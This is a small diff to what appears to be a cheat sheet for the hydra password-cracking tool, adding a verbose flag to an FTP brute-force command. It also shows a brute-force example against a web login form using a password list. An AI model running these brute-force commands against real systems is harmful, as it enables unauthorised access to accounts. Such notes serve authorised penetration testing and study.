@@ -19,7 +19,7 @@ Options:
   <INVALID_RESPONSE>       Part of the response when the login fails
 
 FTP Brute Force:
-  hydra -l ftp -P <PASSLIST_TXT> ftp://TARGET_IP
+  hydra -l ftp -P <PASSLIST_TXT> ftp://TARGET_IP -v
 
 GET Web Form Brute Force Example:
   hydra -l phillips -P ~/john.txt <TARGET_IP> http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -v
